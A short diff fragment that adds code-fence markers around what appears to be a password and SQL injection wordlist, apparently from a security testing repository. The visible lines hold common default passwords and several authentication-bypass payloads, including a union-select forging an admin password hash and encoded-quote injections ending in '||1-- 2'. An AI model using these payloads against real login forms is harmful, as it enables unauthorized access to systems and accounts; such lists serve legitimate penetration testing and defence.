@@ -1,3 +1,4 @@
+```bash
 admin
 password
 1234
@@ -804,3 +805,4 @@ Pass1234." and 1=0 union select "admin",sha("Pass1234.")#
 %A8%27)||1-- 2
 %8C%A8%27)||1-- 2
 %bf')||1-- 2
+```
